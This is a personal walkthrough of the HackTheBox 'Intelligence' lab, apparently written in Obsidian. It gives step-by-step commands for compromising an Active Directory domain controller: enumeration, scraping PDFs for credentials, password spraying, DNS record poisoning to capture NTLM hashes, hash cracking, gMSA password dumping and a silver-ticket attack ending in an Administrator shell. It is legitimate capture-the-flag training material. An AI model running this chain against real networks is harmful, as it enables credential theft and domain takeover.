2022
### NMAP

```
sudo nmap -sC -sV -oN nmap-intelligence 10.10.10.248
```

![[HackTheBox/Windows/attachments/Pasted image 20250514001257.png]]
- 53, 80, 88, 135, 139, 389, 445, 464, 593, 3269, etc
- domain: intelligence.htb
- dns: dc.intelligence.htb
- add these to `/etc/hosts`

### RPCCLIENT

```
rpcclient -U '' 10.10.10.248
```

Just hit enter at  prompt but no login

![[HackTheBox/Windows/attachments/Pasted image 20250514194336.png]]

Add -N to say no password 
```
rpcclient -U '' -N 10.10.10.248
```

We get logged in 

![[HackTheBox/Windows/attachments/Pasted image 20250514194454.png]]

#### RPCLIENT Enumeration

```
enumdomusers
```

Access denied. 
![[HackTheBox/Windows/attachments/Pasted image 20250514194545.png]]

### CrackMapExec

General 
```
crackmapexec smb 10.10.10.248
```

![[HackTheBox/Windows/attachments/Pasted image 20250514194646.png]]

Enumerate shares
```
crackmapexec smb 10.10.10.248 --shares
```

![[HackTheBox/Windows/attachments/Pasted image 20250514194737.png]]
- nada

Enumerate shares with null username and password 
```
crackmapexec smb 10.10.10.248 -u '' -p '' --shares
```

![[HackTheBox/Windows/attachments/Pasted image 20250514195037.png]]

Get password policy 
```
crackmapexec smb 10.10.10.248 --pass-pol
```

![[HackTheBox/Windows/attachments/Pasted image 20250514194832.png]]
- still nothing

Dump users
```
crackmapexec smb 10.10.10.248 --users
```

![[HackTheBox/Windows/attachments/Pasted image 20250514194913.png]]
- nope

### Enumerating ALL the web apps

- Navigate to each host name found, but they all go to the same site 
![[HackTheBox/Windows/attachments/Pasted image 20250514195155.png]]

There's an email address form
![[HackTheBox/Windows/attachments/Pasted image 20250514195235.png]]
- open dev tools when hitting subscribe to view the network activity

![[HackTheBox/Windows/attachments/Pasted image 20250514195347.png]]
- it doesn't look like any POST requests sent with this form 
- not gonna be useful 

Potential username of contact 
![[HackTheBox/Windows/attachments/Pasted image 20250514195449.png]]

There's also some documents available to download 
![[HackTheBox/Windows/attachments/Pasted image 20250514195544.png]]

Checking out these documents and how they are named
![[HackTheBox/Windows/attachments/Pasted image 20250514195621.png]]
- Named: YYYY-MM-DD-upload.pdf

We can try to build a wordlist of dates to read other files 👀

#### Building wordlist of dates

```
for i in $(seq 330 695); do date --date="$i day ago" +%Y-%m-%d-upload.pdf; done > files
```

Result
![[HackTheBox/Windows/attachments/Pasted image 20250514214929.png]]

Now construct the wget against the server with the files wordlist to try to read files 

```
for i in $(cat ../files); do wget http://10.10.10.248/documents/$i; done
```

![[HackTheBox/Windows/attachments/Pasted image 20250514215951.png]]

Review what files we were able to download 

![[HackTheBox/Windows/attachments/Pasted image 20250514220128.png]]
View the metadata fields of the pdfs using this command
```
exiftool *.pdf | awk -F: '{print $1}' | sort -u 
```

![[HackTheBox/Windows/attachments/Pasted image 20250514220448.png]]

View the modification date/time of the files

```
exiftool *.pdf | grep Modification | sort -u
```

![[HackTheBox/Windows/attachments/Pasted image 20250514220644.png]]
- everything is the same

View the creator of the files
```
exiftool *.pdf | grep Creator | awk '{print $3}' > users
```
![[HackTheBox/Windows/attachments/Pasted image 20250514220828.png]]
- now we have a list of usernames

### kerbrute

Enumerate users in a domain
```
./kerbrute userenum --dc 10.10.10.248 -d intelligence.htb users
```

There's 84 users 
![[HackTheBox/Windows/attachments/Pasted image 20250514221425.png]]

Password spraying 

```
./kerbrute passwordspray --dc 10.10.10.248 -d intelligence.htb users 'Winter2020!'
```
![[HackTheBox/Windows/attachments/Pasted image 20250514221537.png]]
- no hits

#### Trying to read the files / pdfs by converting them to text 

Script it oot
```
for i in $(ls); do pdftotext $i; done
```

All of the pdfs are also txt files now
![[HackTheBox/Windows/attachments/Pasted image 20250514232734.png]]

Cat the txt files and grep for passwords

```
cat *.txt | grep -i password
```

![[HackTheBox/Windows/attachments/Pasted image 20250514233540.png]]
- nice

Add -B5 and -A5 to get before and after 5 lines

```
cat *.txt | grep -i password -B5 -A5
```

![[HackTheBox/Windows/attachments/Pasted image 20250514233652.png]]
- got password: `NewIntelligenceCorpUser9876`
- no username though..but we have a users list 

#### Password spraying with Kerbrute 

```
./kerbrute passwordspray --dc 10.10.10.248 -d intelligence.htb users NewIntelligenceCorpUser9876
```

We got a match! Tiffany.Molina
![[HackTheBox/Windows/attachments/Pasted image 20250514234015.png]]

### See where creds are valid

#### Crackmapexec smb shares

```
crackmapexec smb 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --shares
```

![[HackTheBox/Windows/attachments/Pasted image 20250514234846.png]]
#### Crackmapexec winrm 

```
crackmapexec winrm 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 
```

![[HackTheBox/Windows/attachments/Pasted image 20250514234748.png]]
- nope

#### Crackmapexec crawl smb shares

```
crackmapexec smb 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --shares -M spider_plus
```

Reviewing results

```
cat /tmp/cme_spider_plus/10.10.10.248.json | jq '. | keys'
```

![[HackTheBox/Windows/attachments/Pasted image 20250515193637.png]]

See the files within the file shares
```
cat /tmp/cme_spider_plus/10.10.10.248.json | jq '. | map_values(keys)'
```

![[HackTheBox/Windows/attachments/Pasted image 20250515193756.png]]

We see one PowerShell script that may be interesting?

Download this script using smbclient 

```
smbclient -U Tiffany.Molina //10.10.10.248/IT
```

**if trying to connect to a box that isn't the dc**
```
smbclient -U intelligence\\Tiffany.Molina //10.10.10.248/IT
```

Download the PowerShell script 

```
get downdetector.ps1
```
![[HackTheBox/Windows/attachments/Pasted image 20250515201751.png]]

Checkout out this script
![[HackTheBox/Windows/attachments/Pasted image 20250515212030.png]]
### Bloodhound

```
python3.8 bloodhound.py -ns 10.10.10.248 -d intelligence.htb -dc dc.intelligence.htb -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -c All
```

Checkout bloodhound data 

```
sudo neo4j console
```

Run bloodhound 
```
bloodhound
```

Drag and drop bloodhound files to the console.

Navigate to analysis and select 

**Find all Domain Admins**
- There is only one *Administrator*
**Find Shortest Paths to Domain Admins**
- We have to be 
	- enterprise admin
	- administrators
	- administrative user 

Mark Tiffany.Molina as owned... Found nothing interesting in bloodhound.

Used crackmapexec to get a list of users and marked some administrative users as high value targets. 

We want to get to Ted Graves or Laura.

Anyone can create a domain entry in active directory. 

### krbrelayx's DNS Tool

Download krbrelayx from [GitHub](https://github.com/dirkjanm/krbrelayx)

```
git clone https://github.com/dirkjanm/krbrelayx.git
```

This repo has dnstool.py 

```
python3.8 dnstool.py
```

![[HackTheBox/Windows/attachments/Pasted image 20250519210914.png]]

Use dnstool to create an A Record on AD server

```
python3.8 dnstool.py -u 'intelligence\tiffany.molina' -p NewIntelligenceCorpUser9876 -r webippsec.intelligence.htb -a add -t A -d 10.10.14.8 10.10.10.248
```

This worked!
![[HackTheBox/Windows/attachments/Pasted image 20250519211621.png]]

Set up a nc listener to see if we get a connection back.

```
sudo nc -nvlp 80
```

We do get a connection back!

![[HackTheBox/Windows/attachments/Pasted image 20250519211936.png]]

Performing nslookup to verify the A records point back to us 

![[HackTheBox/Windows/attachments/Pasted image 20250519212049.png]]

Now we could use responder to perform the following..but trying out MSF_ Capture http_ntlm module instead 
### MSF_Capture http_ntlm module 

```
sudo msfdb run
```

```
use auxiliary/server/capture/http_ntlm
```

```
show options
```

![[HackTheBox/Windows/attachments/Pasted image 20250519212509.png]]

```
set SRVPORT 80 
```

```
set URIPATH /
```

```
set RHOSTS 10.10.14.8
```

```
set JOHNPWFILE intelligence
```

RUN

![[HackTheBox/Windows/attachments/Pasted image 20250519212718.png]]

In order to see what's happening -> use tcpdump 

```
sudo tcpdump -i tun0 port 80 -n -vvv
```

![[HackTheBox/Windows/attachments/Pasted image 20250519212849.png]]

We get Ted.Graves' hash 

![[HackTheBox/Windows/attachments/Pasted image 20250519212944.png]]

Validate it's an NTLM hash using crackmapexec 

```
crackmapexec smb 10.10.10.248 -u ted.graves -H f3iriyueheh487373
```

![[HackTheBox/Windows/attachments/Pasted image 20250519213114.png]]
- no this hash didn't work

Crack this hash with #john 

![[HackTheBox/Windows/attachments/Pasted image 20250519213256.png]]

```
john intelligence_netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt
```

![[HackTheBox/Windows/attachments/Pasted image 20250519213437.png]]
- it cracked!

```
john intelligence_netntlmv2 --show
```
The password is `Mr.Teddy`

Re-trying crackmapexec

```
crackmapexec smb 10.10.10.248 -u ted.graves -p Mr.Teddy
```

![[HackTheBox/Windows/attachments/Pasted image 20250519213712.png]]

Marking Ted as owned in Bloodhound and discover he could "ReadGMSAPassword"

![[HackTheBox/Windows/attachments/Pasted image 20250519213919.png]]

Use this [gMSADumper tool](https://github.com/micahvandeusen/gMSADumper) to extract the svc_int hash

```
git clone https://github.com/micahvandeusen/gMSADumper.git
```

```
python3.8 gMSADumper.py -u 'ted.graves' -p  Mr.Teddy -d intelligence.htb
```

![[HackTheBox/Windows/attachments/Pasted image 20250519214238.png]]

![[HackTheBox/Windows/attachments/Pasted image 20250519214321.png]]

Validate this hash using crackmapexec

```
crackmapexec smb 10.10.10.248 -u svc_int$ -H b98d4ceiuryrye8f
```

![[HackTheBox/Windows/attachments/Pasted image 20250519214500.png]]
- no psexec :(
- no winrm :(
- can generate silver ticket :)

### Generate a silver ticket 

Ensure ntpdate is synced

```
sudo ntpdate 10.10.10.248
```

#### Use impacket's getST.py (get silver ticket)

Usually in `/impacket/examples`

```
python3.8 getST.py -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_in$ -hashes b6489737383942747r7:b69ugrwdwiuyr828
```

![[HackTheBox/Windows/attachments/Pasted image 20250519215034.png]]
- got that admin silver tickyyy

```
export KRB5CCNAME=Administrator.ccache
```

Then use impacket's psexec which should pull the exported ccache ticket

```
KRB5CCNAME=Administrator.ccache impacket-psexec -k -no-pass intelligence.htb/Administrator@dc.intelligence.htb
```

We get logged in as Administrator 

![[HackTheBox/Windows/attachments/Pasted image 20250519215726.png]]

⭐got system⭐